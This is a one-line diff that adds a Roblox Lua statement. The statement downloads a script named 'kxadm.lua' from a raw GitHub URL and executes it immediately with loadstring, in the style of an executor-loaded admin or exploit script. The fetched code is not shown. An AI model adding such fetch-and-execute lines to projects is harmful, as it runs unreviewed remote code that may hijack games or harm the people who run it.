@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Keraunius/213sadd23/refs/heads/main/kxadm.lua"))()
